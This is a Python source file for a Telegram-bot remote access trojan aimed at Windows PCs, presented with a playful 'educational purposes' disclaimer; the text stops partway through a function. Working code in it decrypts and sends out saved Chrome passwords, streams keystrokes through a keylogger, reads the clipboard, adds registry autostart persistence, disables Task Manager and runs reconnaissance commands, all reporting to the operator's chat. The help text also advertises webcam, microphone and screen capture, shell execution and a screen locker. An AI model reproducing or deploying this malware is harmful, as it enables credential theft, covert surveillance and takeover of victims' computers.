#licensed by Shamil :)
#password is acd
import telebot
import os
import random
import pyttsx3
import pyautogui
import cv2
import json
import ctypes
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import time
import stat
import pyaudio
import wave
import numpy as np
import shutil
from pynput import keyboard
from datetime import datetime, timedelta
try:
    bot = telebot.TeleBot('YOUR_API_TOKEN')
except Exception as e:
    pass
#################################################################################
textovik = """
## **🛠️ System Commands**
- ⚙️ **/start** - Start the program
- ⚙️ **/help** - Help with commands
- 🔌 **/addstartup** - Add autostart
- 🔌 **/deletestartup** - Delete file from autostart
- ⌨️ **/keylogger** - Start keylogger
- ⛔ **/stopkeylogger** - Stop keylogger
- 👟 **/run [filepath]** - Run file
- 🧑🏻‍💻 **/users** - Show users on the PC
- 🖥️ **/whoami** - Show the name of the PC
- 📃 **/tasklist** - Show running tasks
- 🧨 **/taskkill [task]** - Kill the entered task
- 💤 **/sleep** - Put the PC to sleep
- 🕚 **/shutdown** - Shutdown the PC
- 🔄 **/restart** - Restart the PC
- 💥 **/altf4** - ALT + F4 (google it to find what it means)
- 💣 **/cmdbomb** - Opens 10 CMD windows
- Ⓜ️ **/msg [type] [title] [text]** - Displays a messagebox
*/msg types(info; warning; error; question; default or 0)*
** for ex: /msg error testtitle testtext **

## **🔒 Security & Privacy**
- 🔑 **/passwords** - Show saved passwords on the PC
- 🧱 **/wallpaper** - Change the desktop wallpaper
- 🪦 **/disabletaskmgr** - Disable Task Manager
- 📠 **/enabletaskmgr** - Enable Task Manager
- ☢️ **/winblocker** - My own winlocker
- ☣️ **/winblocker2** - If winblocker doesn't work

## **📱 Device Management**
- 📷 **/screenshot** - Take a screenshot
- 🎙️ **/mic [time in seconds]** - Record the PC's microphone
- 📹 **/webscreen** - Get a screenshot from the camera
- 🎦 **/webcam** - Get webcam video
- 🎥 **/screenrecord** - Record the screen
- 🚫 **/block** - Block user input (mouse and keyboard)
- ✅ **/unblock** - Unblock user input (mouse and keyboard)
- 🖱️ **/mousemesstart** - Start mouse messing
- 🐁 **/mousemesstop** - Stop mouse messing
- 🪤 **/mousekill** - Disable the mouse
- 🐭 **/mousestop** - Enable the mouse
- 🖱️ **/mousemove [x] [y]** - Enter x and y cordinates and mouse's pointer goes there
- 🐁 **/mouseclick** - Make left click with mouse
- 🖱️ **/mouseright** - Make right click with mouse
- 🔊 **/fullvolume** - Set volume to full
- 🔉 **/volumeplus** - Increase volume by 10
- 🔇 **/volumeminus** - Decrease volume by 10
- 🪟 **/maximize** - Maximize active window
- 🪟 **/minimize** - Minimize active window

## **🌐 Networking**
- 🛜 **/wifilist** - Show saved Wi-Fi networks
- 🔐 **/wifipass [accesspoint]** - Show the password of a saved Wi-Fi network
- 🌐 **/chrome [website URL]** - Open a website in Chrome
- 🌐 **/edge [website URL]** - Open a website in Edge
- 🌐 **/firefox [website URL]** - Open a website in Firefox

## **🎶 Multimedia**
- 💬👂🏻 **/textspech [your text]** - Speak the text aloud
- 🎵 **/playsound [file path]** - Play a sound file (first upload the file using **/upload**)
- 📁 **/download [file path]** - Download a file from the PC
- 🗃️ **/upload** - Upload a file to the PC
- 📋 **/clipboard** - Show clipboard content
- 📇 **/changeclipboard [testcahnge]** - Change clipboard content

## **⚙️ Advanced Operations**
- 🗡️ **/e [command]** - Execute shell commands (shortcut)
- 🏹 **/ex [command]** - Execute shell commands with long responses
- 🔫 **/execute** - Execute shell commands my alternative of netcat in linux (works commands such as cd ,cd.. and etc...)
- *commands like cd ,cd .. and others work excellent in the /e ,  /ex and /execute commands.*
- 📅 **/metadata [filepath]** - Displays the file's metadata information
- ⌨️ **/keytype [key]** - Enter a text and that text will written with pc's keyboard
- ⌨️ **/keypress [key]** - Press a specific key on the keyboard
- ⌨️ **/keypresstwo [key1] [key2]** - Press two keys simultaneously
- ⌨️ **/keypressthree [key1] [key2] [key3]** - Press three keys simultaneously
- 🕶️ **/hide** - Hide your app
- 👓 **/unhide** - Unhide your app

## **🖥️ System Information**
- 🪪 **/info** - Show PC information (IP, location, country, city)
- 📊 **/pcinfo** - Info about PC's OS, system, CPU, Windows version, BIOS, etc...
- 💻 **/shortinfo** - Show's less but, mostly the necessary information about pc
- 🛠️ **/apps** - Show installed apps on the PC
- 🔋 **/batteryinfo** - Show info about battery 

## **EXAMPLES:**
- 📖 **/examples** - Shows examples

## **📱🤳🏻My Socials:🌐📲**
- 🔗 **/github** - [**My github**]
"""
examplestext = """
## **Examples:**
- **/e whoami** → **Output**: win-9bn5tk4e2b7\\user
- **/e cd /home** → **Output**: You are in: home
- **/run C:\\Users\\user\\Pictures\\test.png** → **Output**: File opened successfully!
- **/mousemove 50 80 ** → **Output**: Mouse pointer moved to {x} and {y} cordinates successfully!
- **/keypress x ** → **Output**: \'x\' key has pressed successfully!
- **/msg info testtitle testtexthi** → **Output**: Successfully displayed! 
"""
n = False

@bot.message_handler(commands=['start'])

def start(message):
    
    if n == False:
        bot.send_message(message.chat.id, "Enter password:")
        bot.register_next_step_handler(message, checkpass)
    else:
            bot.send_message(message.chat.id, "Connection!")
            if message.from_user.last_name == None:
                bot.send_message(message.chat.id, f'Salam aleykum, {message.from_user.first_name}! I promise you will use this only for educational purposes :)')
            else:
                bot.send_message(message.chat.id, f'Salam aleykum ,{message.from_user.first_name} {message.from_user.last_name}! I promise you will use this only for educational purposes :)')
            bot.send_message(message.chat.id, '❗I am not responsible for your actions❕')
            result = os.popen('whoami').read().strip()
            bot.send_message(message.chat.id, f'You can use /help')
            bot.send_message(message.chat.id, f'Pc\'s name is: {result}')
            bot.send_message(message.chat.id, '🔗My GitHub page: [**GitHub - WhiteeRabbit**](https://github.com/WhiteeRabbit)')

def checkpass(message):
        if message.text == 'acd':
            global n
            n = True
            bot.send_message(message.chat.id, 'Logged successfully!')
            bot.send_message(message.chat.id, "Connection!")
            if message.from_user.last_name == None:
                bot.send_message(message.chat.id, f'Salam aleykum, {message.from_user.first_name}! I promise you will use this only for educational purposes :)')
            else:
                bot.send_message(message.chat.id, f'Salam aleykum ,{message.from_user.first_name} {message.from_user.last_name}! I promise you will use this only for educational purposes :)')
            bot.send_message(message.chat.id, '❗I am not responsible for your actions❕')
            result = os.popen('whoami').read().strip()
            bot.send_message(message.chat.id, f'You can use /help')
            bot.send_message(message.chat.id, f'Pc name is: {result}')
            bot.send_message(message.chat.id, '🔗My GitHub page: [**GitHub - WhiteeRabbit**](https://github.com/WhiteeRabbit)')

        else:
            bot.send_message(message.chat.id, 'password is wrong')
            
#################################################################################            
@bot.message_handler(commands=['deletestartup'])
def delete_startup(message):
    try:
        key_name = "Triton"

    
        command = f'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "{key_name}" /f'
        result = os.system(command)
        if result == 0:
            bot.send_message(message.chat.id, "Removed from autostart successfully!")
        else:
            bot.send_message(message.chat.id, "ERROR")
    except Exception as e:
        bot.send_message(message.chat.id, f'Error{e}')


#################################################################################    
user_state = {}

@bot.message_handler(commands=['addstartup'])
def add_startup(message):
    bot.send_message(message.chat.id, 'Enter the name of your exe file (full path):')
    user_state[message.chat.id] = 'waiting_for_path'

@bot.message_handler(func=lambda message: user_state.get(message.chat.id) == 'waiting_for_path')
def handle_executable_path(message):
    executable_path = message.text
    
    

    key_name = "Triton"

    command = f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "{key_name}" /t REG_SZ /d "{executable_path}" /f'

    result = os.system(command)

    if result == 0:
        bot.send_message(message.chat.id, "Added to autostart successfully!")
    else:
        bot.send_message(message.chat.id, "ERROR")

    user_state.pop(message.chat.id, None)
    # startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    
    # if not os.path.exists(executable_path):
    #     bot.send_message(message.chat.id, 'The specified file does not exist. Please try again.')
    # elif not executable_path.lower().endswith('.exe'):
    #     bot.send_message(message.chat.id, 'Please provide a valid .exe file path.')
    # else:
    #     if os.path.isdir(startup_folder):
    #         executable_filename = os.path.basename(executable_path)
    #         destination_path = os.path.join(startup_folder, executable_filename)
    #         try:
    #             shutil.copyfile(executable_path, destination_path)
    #             bot.send_message(message.chat.id, f'{executable_filename} added to startup successfully!')
    #         except Exception as e:
    #             bot.send_message(message.chat.id, f'Failed to add to startup: {e}')
    #     else:
    #         bot.send_message(message.chat.id, 'Startup folder not found.')
    
    # user_state.pop(message.chat.id, None)

#################################################################################
@bot.message_handler(commands=['mouseright'])
def mousecontext(message):
    try:
        pyautogui.rightClick()
        bot.send_message(message.chat.id , 'Right mouse clicked!')
    except Exception as e:
        bot.send_message(message.chat.id, f'Error: {e}')      
#################################################################################
@bot.message_handler(commands=['passwords'])
def send_passwords(message):

    bot.send_message(message.chat.id, "Catching passwords...")


    key = get_encryption_key()


    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")

    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)


    db = sqlite3.connect(filename)
    cursor = db.cursor()


    cursor.execute("SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_created")

    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]        

        
        if username or password:
            bot.send_message(message.chat.id, f"Origin URL: {origin_url}")
            bot.send_message(message.chat.id, f"Action URL: {action_url}")
            bot.send_message(message.chat.id, f"Username: {username}")
            bot.send_message(message.chat.id, f"Password: {password}")
        else:
            continue

        if date_created != 86400000000 and date_created:
            bot.send_message(message.chat.id, f"Creation date: {str(get_chrome_datetime(date_created))}")

        if date_last_used != 86400000000 and date_last_used:
            bot.send_message(message.chat.id, f"Last Used: {str(get_chrome_datetime(date_last_used))}")

        bot.send_message(message.chat.id, "=" * 50)

###################################################################


    data_to_send = ""

    cursor.execute("SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_created")


    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]        


        if username or password:
            data_to_send += f"Origin URL: {origin_url}\n"
            data_to_send += f"Action URL: {action_url}\n"
            data_to_send += f"Username: {username}\n"
            data_to_send += f"Password: {password}\n"

        if date_created != 86400000000 and date_created:
            data_to_send += f"Creation date: {str(get_chrome_datetime(date_created))}\n"

        if date_last_used != 86400000000 and date_last_used:
            data_to_send += f"Last Used: {str(get_chrome_datetime(date_last_used))}\n"

        data_to_send += "=" * 50 + "\n\n"



    cursor.close()
    db.close()


    try:
        os.remove(filename)
    except Exception as e:
        print(f"Error while deleting file: {e}")


    if data_to_send:
        with open("passwords.txt", "w", encoding="utf-8") as file:
            file.write(data_to_send)


        with open("passwords.txt", "rb") as file:
            bot.send_document(message.chat.id, file)
    
    else:
        bot.send_message(message.chat.id, "There is no passwordds to send them.")
    os.remove('passwords.txt')
###################################################################


def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]

    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except Exception as e:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
#############################################################################

@bot.message_handler(commands=['taskkill'])
def task_kill(message):

    try:
        task = message.text.split('/taskkill', 1)[1].strip()
        ss = os.popen(f'taskkill /f /im {task}').read().strip()
        bot.send_message(message.chat.id , f'{ss}')
    except Exception as e:
        bot.send_message(message.chat.id, f'Error: {e}')
#############################################################################

@bot.message_handler(commands=['msg'])
def show_message_box(message):
    try:
        keypwo = message.text.split('/msg', 1)[1].strip().split()
        msg_type = keypwo[0]
        title = keypwo[1]
        text = keypwo[2]
        
        types = {
            "info": 64,     
            "warning": 48,
            "error": 16,
            "question": 32,
            "default": 0
        }
        msg_type = types.get(msg_type, 0)  
        

        command = f'mshta vbscript:Execute("msgbox ""{text}"", {msg_type}, ""{title}"":close")'
        bot.send_message(message.chat.id, "Successfully displayed!")
        os.popen(command)
    except Exception as e:
        bot.send_message(message.chat.id, f'Error:{e}')
#############################################################################

@bot.message_handler(commands=['stopkeylogger'])
def stop_key(message):
    global end
    end = 1    
    bot.send_message(message.chat.id, "Keylogger stopped!")
    
#############################################################################
@bot.message_handler(commands=['keylogger'])
def track_all_keys(message):
    try:
        bot.send_message(message.chat.id, "Keylogger started!")
        bot.send_message(message.chat.id, "Run: /stopkeylogger to stop")
        global end
        end = 0
        def on_press(key):

            try:
                bot.send_message(message.chat.id, f"Pressed key: {key.char}")
            except AttributeError:
                bot.send_message(message.chat.id, f"Special key pressed: {key}")

        def on_release(key):

            if end == 1:
                bot.send_message(message.chat.id, "Keylogger stopped!")
                return False

        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except Exception as e:
        bot.send_message(message.chat.id, f'Error:{e}')
#############################################################################
@bot.message_handler(commands=['clipboard'])
def get_clipboard_content(message):
    usid = message.from_user.id
    clientid = message.chat.id
    
    if usid == clientid:
        CF_TEXT = 1
        kernel32 = ctypes.windll.kernel32
        kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
        kernel32.GlobalLock.restype = ctypes.c_void_p
        kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
        user32 = ctypes.windll.user32
        user32.GetClipboardData.restype = ctypes.c_void_p
        user32.OpenClipboard(0)
        if user32.IsClipboardFormatAvailable(CF_TEXT):
            data = user32.GetClipboardData(CF_TEXT)
            data_locked = kernel32.GlobalLock(data)
            text = ctypes.c_char_p(data_locked)
            value = text.value
            kernel32.GlobalUnlock(data_locked)
            body = value.decode()
            user32.CloseClipboard()
            username = os.getlogin()
            bot.send_message(message.chat.id , f'{username} \'s clipboard is:  {body}')


#############################################################################s
global mousekill
mousekill = 42


 
@bot.message_handler(commands=['mousestop'])
def mou(message):
    global mousekill
    mousekill = 7
    bot.send_message(message.chat.id , 'mouse kill has stopped!')
 


#############################################################################
 
@bot.message_handler(commands=['mousekill'])
def mous(message):

    try:
        bot.send_message(message.chat.id , 'mouse kill has started!')

        while mousekill != 7:
            pyautogui.moveTo(500,500)
            #time.sleep(1)
    except Exception as e:
        bot.send_message(message.chat.id , f'Error{e}')

#############################################################################

global mousemess
mousemess = 42

#############################################################################
 
@bot.message_handler(commands=['mousemesstop'])
def moust(message):
    global mousemess
    mousemess = 7
    bot.send_message(message.chat.id , 'mouse mess has stopped!')
 
 

#############################################################################
 
@bot.message_handler(commands=['mousemesstart'])
def mous(message):

    try:
        bot.send_message(message.chat.id , 'mouse mess has started!')

        while mousemess != 7:
            x=random.randint(666, 999)
            y=random.randint(666, 999)
            pyautogui.moveTo(x, y, 7)
            time.sleep(1)
    except Exception as e:
        bot.send_message(message.chat.id , f'Error{e}')

#############################################################################

@bot.message_handler(commands=['keytype'])
def keytyp(message):
    try:
        
        text = message.text.split('/keytype' , 1)[1].strip()
        
        pyautogui.write(text)

    except Exception as e:
        bot.send_message(message.chat.id , f'Error{e}')



###################################################################

@bot.message_handler(commands=['mousemove'])
def mousemove(message):
    try:
        cordinates = message.text.split('/mousemove', 1)[1].strip().split()
        x = int(cordinates[0])
        y = int(cordinates[1])
        
        pyautogui.moveTo(x, y)
    
        bot.send_message(message.chat.id , f'Mouse pointer moved to {x} and {y} cordinates successfully!')
    
    except Exception as e:
        bot.send_message(message.chat.id , f'Error{e}')
        
        
###################################################################

@bot.message_handler(commands=['mouseclick'])
def mousemove(message):
    try:
        
        pyautogui.click()

        bot.send_message(message.chat.id , 'Mouse clicked!')
    
    except Exception as e:
        bot.send_message(message.chat.id , f'Error{e}')
#############################################################################

@bot.message_handler(commands=['keypress'])
def keyprs(message):
 
    keys = ['!', '"', '#', '$', '%', '&', "'", '(',
    ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7',
    '8', '9', ':', ';', '<', '=', '>', '?', '@', '[', '\\', ']', '^', '_', '`',
    'a', 'b', 'c', 'd', 'e','f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o',
    'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~',
    'accept', 'add', 'alt', 'altleft', 'altright', 'apps', 'backspace',
    'browserback', 'browserfavorites', 'browserforward', 'browserhome',
    'browserrefresh', 'browsersearch', 'browserstop', 'capslock', 'clear',
    'convert', 'ctrl', 'ctrlleft', 'ctrlright', 'decimal', 'del', 'delete',
    'divide', 'down', 'end', 'enter', 'esc', 'escape', 'execute', 'f1', 'f10',
    'f11', 'f12', 'f13', 'f14', 'f15', 'f16', 'f17', 'f18', 'f19', 'f2', 'f20',
    'f21', 'f22', 'f23', 'f24', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9',
    'final', 'fn', 'hanguel', 'hangul', 'hanja', 'help', 'home', 'insert', 'junja',
    'kana', 'kanji', 'launchapp1', 'launchapp2', 'launchmail',
    'launchmediaselect', 'left', 'modechange', 'multiply', 'nexttrack',
    'nonconvert', 'num0', 'num1', 'num2', 'num3', 'num4', 'num5', 'num6',
    'num7', 'num8', 'num9', 'numlock', 'pagedown', 'pageup', 'pause', 'pgdn',
    'pgup', 'playpause', 'prevtrack', 'print', 'printscreen', 'prntscrn',
    'prtsc', 'prtscr', 'return', 'right', 'scrolllock', 'select', 'separator',
    'shift', 'shiftleft', 'shiftright', 'sleep', 'space', 'stop', 'subtract', 'tab',
    'up', 'volumedown', 'volumemute', 'volumeup', 'win', 'winleft', 'winright', 'yen',
    'command', 'option', 'optionleft', 'optionright']

    try:

        bot.send_message(message.chat.id , '(/keypress win) You can use this keys:')
        bot.send_message(message.chat.id , str(keys))

        keypr = message.text.split('/keypress', 1)[1].strip()
        pyautogui.press(keypr) 
        bot.send_message(message.chat.id , f'\'{keypr}\'  key has pressed successfully!')
    except Exception as e:
        bot.send_message(message.chat.id , f"Error: {e}")  


#############################################################################        




@bot.message_handler(commands=['keypresstwo'])
def keyprs(message):
 
    keys = ['!', '"', '#', '$', '%', '&', "'", '(',
    ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7',
    '8', '9', ':', ';', '<', '=', '>', '?', '@', '[', '\\', ']', '^', '_', '`',
    'a', 'b', 'c', 'd', 'e','f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o',
    'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~',
    'accept', 'add', 'alt', 'altleft', 'altright', 'apps', 'backspace',
    'browserback', 'browserfavorites', 'browserforward', 'browserhome',
    'browserrefresh', 'browsersearch', 'browserstop', 'capslock', 'clear',
    'convert', 'ctrl', 'ctrlleft', 'ctrlright', 'decimal', 'del', 'delete',
    'divide', 'down', 'end', 'enter', 'esc', 'escape', 'execute', 'f1', 'f10',
    'f11', 'f12', 'f13', 'f14', 'f15', 'f16', 'f17', 'f18', 'f19', 'f2', 'f20',
    'f21', 'f22', 'f23', 'f24', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9',
    'final', 'fn', 'hanguel', 'hangul', 'hanja', 'help', 'home', 'insert', 'junja',
    'kana', 'kanji', 'launchapp1', 'launchapp2', 'launchmail',
    'launchmediaselect', 'left', 'modechange', 'multiply', 'nexttrack',
    'nonconvert', 'num0', 'num1', 'num2', 'num3', 'num4', 'num5', 'num6',
    'num7', 'num8', 'num9', 'numlock', 'pagedown', 'pageup', 'pause', 'pgdn',
    'pgup', 'playpause', 'prevtrack', 'print', 'printscreen', 'prntscrn',
    'prtsc', 'prtscr', 'return', 'right', 'scrolllock', 'select', 'separator',
    'shift', 'shiftleft', 'shiftright', 'sleep', 'space', 'stop', 'subtract', 'tab',
    'up', 'volumedown', 'volumemute', 'volumeup', 'win', 'winleft', 'winright', 'yen',
    'command', 'option', 'optionleft', 'optionright']

    try:

        bot.send_message(message.chat.id , '(/keypresstwo win r) You can use this keys:')
        bot.send_message(message.chat.id , str(keys))

        keypwo = message.text.split('/keypresstwo', 1)[1].strip().split()
        key1 = keypwo[0]
        
        key2 = keypwo[1]

        pyautogui.hotkey(key1, key2)
        bot.send_message(message.chat.id , f'key has pressed successfully!')
    except Exception as e:
        bot.send_message(message.chat.id , f"Error: {e}")  
        
#############################################################################        


@bot.message_handler(commands=['keypressthree'])
def keyprs(message):
 
    keys = ['!', '"', '#', '$', '%', '&', "'", '(',
    ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7',
    '8', '9', ':', ';', '<', '=', '>', '?', '@', '[', '\\', ']', '^', '_', '`',
    'a', 'b', 'c', 'd', 'e','f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o',
    'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~',
    'accept', 'add', 'alt', 'altleft', 'altright', 'apps', 'backspace',
    'browserback', 'browserfavorites', 'browserforward', 'browserhome',
    'browserrefresh', 'browsersearch', 'browserstop', 'capslock', 'clear',
    'convert', 'ctrl', 'ctrlleft', 'ctrlright', 'decimal', 'del', 'delete',
    'divide', 'down', 'end', 'enter', 'esc', 'escape', 'execute', 'f1', 'f10',
    'f11', 'f12', 'f13', 'f14', 'f15', 'f16', 'f17', 'f18', 'f19', 'f2', 'f20',
    'f21', 'f22', 'f23', 'f24', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9',
    'final', 'fn', 'hanguel', 'hangul', 'hanja', 'help', 'home', 'insert', 'junja',
    'kana', 'kanji', 'launchapp1', 'launchapp2', 'launchmail',
    'launchmediaselect', 'left', 'modechange', 'multiply', 'nexttrack',
    'nonconvert', 'num0', 'num1', 'num2', 'num3', 'num4', 'num5', 'num6',
    'num7', 'num8', 'num9', 'numlock', 'pagedown', 'pageup', 'pause', 'pgdn',
    'pgup', 'playpause', 'prevtrack', 'print', 'printscreen', 'prntscrn',
    'prtsc', 'prtscr', 'return', 'right', 'scrolllock', 'select', 'separator',
    'shift', 'shiftleft', 'shiftright', 'sleep', 'space', 'stop', 'subtract', 'tab',
    'up', 'volumedown', 'volumemute', 'volumeup', 'win', 'winleft', 'winright', 'yen',
    'command', 'option', 'optionleft', 'optionright']

    try:
        bot.send_message(message.chat.id , '(/keypressthree ctrl alt esc) You can use this keys:')
        bot.send_message(message.chat.id , str(keys))

        keypwo = message.text.split('/keypressthree', 1)[1].strip().split()
        key1 = keypwo[0]
        
        key2 = keypwo[1]
        
        key3 = keypwo[2]

    
        pyautogui.hotkey(key1, key2 , key3)
        bot.send_message(message.chat.id , f'key has pressed successfully!')
    except Exception as e:
        bot.send_message(message.chat.id , f"Error: {e}")  

#############################################################################
@bot.message_handler(commands=['apps'])
def apps(message):
    try:
        res = os.popen('wmic product get Name, Version , Vendor').read().strip()
        
        lines = res.splitlines()
        
        chunk_size = 30
        chunks = [lines[i:i + chunk_size] for i in range(0, len(lines), chunk_size)]
     
        for chunk in chunks:
            bot.send_message(message.chat.id, "\n".join(chunk).strip())

    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")
        
#############################################################################
@bot.message_handler(commands=['pcinfo'])
def pcinfo(message):
    try: 
        # prop = os.popen('wmic computersystem list brief').read().strip()
        # ver = os.popen('wmic computersystem list brief').read().strip()
        # bios = os.popen('wmic bios get Manufacturer, Version, ReleaseDate, SerialNumber, SMBIOSBIOSVersion').read().strip()
        # cpu = os.popen('wmic cpu get Name, NumberOfCores, NumberOfLogicalProcessors, MaxClockSpeed, Manufacturer, Caption').read().strip()
        # ram = os.popen('wmic memorychip get Capacity, Manufacturer, MemoryType, Speed, PartNumber, DeviceLocator').read().strip()
        # diskdrive = os.popen('wmic diskdrive get Model, Size, SerialNumber, MediaType, InterfaceType, Status').read().strip()
        # osinfo = os.popen('wmic os get Caption, Version, OSArchitecture, BuildNumber, RegisteredUser, SerialNumber, InstallDate').read().strip()
        # networkadapter = os.popen('wmic nicconfig get Description, MACAddress, IPAddress, DefaultIPGateway, DNSHostName, ServiceName').read().strip()
        # bot.send_message(message.chat.id , f"pc properties: {prop}")
        # bot.send_message(message.chat.id , f"pc's os version: {ver}")
        # bot.send_message(message.chat.id , f"pc bios: {bios}")
        # bot.send_message(message.chat.id , f"cpu: {cpu}")
        # bot.send_message(message.chat.id , f"ram: {ram}")
        # bot.send_message(message.chat.id , f"diskdrive: {diskdrive}")
        # bot.send_message(message.chat.id , f"os: {osinfo}")
        # bot.send_message(message.chat.id , f"network adapter: {networkadapter}")    

        prop = os.popen('wmic computersystem list brief').read().strip()
        ver = os.popen('wmic computersystem list brief').read().strip()
        bios = os.popen('wmic bios get Manufacturer, Version, ReleaseDate, SerialNumber, SMBIOSBIOSVersion').read().strip()
        cpu = os.popen('wmic cpu get Name, NumberOfCores, NumberOfLogicalProcessors, MaxClockSpeed, Manufacturer, Caption').read().strip()
        ram = os.popen('wmic memorychip get Capacity, Manufacturer, MemoryType, Speed, PartNumber, DeviceLocator').read().strip()
        diskdrive = os.popen('wmic diskdrive get Model, Size, SerialNumber, MediaType, InterfaceType, Status').read().strip()
        compsysinfo = os.popen('wmic computersystem get Model, Manufacturer, TotalPhysicalMemory, Domain, Username, SystemType, NumberOfProcessors').read().strip()
        osinfo = os.popen('wmic os get Caption, Version, OSArchitecture, BuildNumber, RegisteredUser, SerialNumber, InstallDate').read().strip()
        networkadapter = os.popen('wmic nicconfig get Description, MACAddress, IPAddress, DefaultIPGateway, DNSHostName, ServiceName').read().strip()
        minios = os.popen('wmic os get /format:list').read().strip()

        def send_long_message(chat_id, title, content):
            lines = content.splitlines()
            chunk_size = 30  
            chunks = [lines[i:i + chunk_size] for i in range(0, len(lines), chunk_size)]
            
            for idx, chunk in enumerate(chunks):
                bot.send_message(chat_id, f"{title} (part {idx + 1}):\n" + "\n".join(chunk))
        send_long_message(message.chat.id, "PC Properties", prop)
        send_long_message(message.chat.id, "PC OS Version", ver)
        send_long_message(message.chat.id, "PC BIOS", bios)
        send_long_message(message.chat.id, "CPU Info", cpu)
        send_long_message(message.chat.id, "RAM Info", ram)
        send_long_message(message.chat.id, "Computer Info" , compsysinfo)
        send_long_message(message.chat.id, "Disk Drive Info", diskdrive)
        send_long_message(message.chat.id, "OS Info", osinfo)
        send_long_message(message.chat.id, "Network Adapter Info", networkadapter)
        bot.send_message(message.chat.id, f"System Info: {minios}")


    except Exception as e:
        bot.send_message(message.chat.id , f"Error: {e}")  
                
                
#################################################################################
@bot.message_handler(commands=['batteryinfo'])
def batteryinfo(message):
    try:
        # wmic path Win32_Battery get EstimatedChargeRemaining, BatteryStatus, FullChargeCapacity,Status
        batstatus = os.popen('wmic path Win32_Battery get BatteryStatus').read().strip()
        bates = os.popen('wmic path Win32_Battery get EstimatedChargeRemaining').read().strip()
        batname = os.popen('wmic path Win32_Battery get name').read().strip()
        batsysname = os.popen('wmic path Win32_Battery get SystemName').read().strip()
        bot.send_message(message.chat.id, '''In BatteryStatus. each number represents a specific battery state.
                                Here are the meanings:
                         
                         1 - The battery is discharging
                         2 - The battery is charging
                         3 - The battery is fully charged
                         4 - The battery charge is low
                         5 - The battery charge is critical
                         6 - The battery is charging and will soon be fully.
                         7 - Charge is zero''')

        bot.send_message(message.chat.id, f'Battery status: {batstatus}')
        bot.send_message(message.chat.id, f'Battery System name: {batsysname}')
        bot.send_message(message.chat.id, f'Battery name: {batname}')
        bot.send_message(message.chat.id, f'Battery {bates}%')
    except Exception as e:
        bot.send_message(message.chat.id , f"Error: {e}")
#############################################################################

@bot.message_handler(commands=['shortinfo'])
def shortpcinfo(message):
    try:
        bot.send_message(message.chat.id , 'Please wait...')
        host_name = os.getenv('COMPUTERNAME', 'Unknown')

        os_name = os.popen('ver').read().strip()
        
        try:
            os_version = os.popen('wmic os get version').read().splitlines()[2].strip()
        except IndexError:
            os_version = 'Unknown'

        try:
            processor_info = os.popen('wmic cpu get Name').read().splitlines()[2].strip()
        except IndexError:
            processor_info = 'Unknown'

        cores = os.cpu_count()

        if os.name == 'nt':
            total_ram = os.popen('wmic computersystem get TotalPhysicalMemory').read().splitlines()[2].strip()
            total_ram = f"{int(total_ram) // (1024 ** 2)} MB" if total_ram.isdigit() else "Not available"
        else:
            total_ram = "Not available"

        boot_time_str = os.popen('systeminfo | find "System Boot Time"').read().strip()
        if boot_time_str:
            boot_time = boot_time_str.split(":")[1].strip()
        else:
            boot_time = "Not available"

        info = {
            "System": os_name,
            "Host name": host_name,
            "OS version": os_version,
            "CPU": processor_info,
            "Core count": cores,
            "RAM": total_ram,
            "Boot time": boot_time
        }

        info_text = "\n".join([f"{key}: {value}" for key, value in info.items()])


        bot.send_message(message.chat.id, info_text)

    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

#############################################################################
@bot.message_handler(commands=['disabletaskmgr'])
def disabtsk(message):       
    try:
        disable_command = r'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f'
        os.popen(disable_command)
        bot.send_message(message.chat.id , 'taskmanager disabled!')
    except Exception as e:
        bot.send_message(message.chat.id , f"Error: {e}")
        
               
        
#############################################################################
@bot.message_handler(commands=['block'])
def block(message):
    try:
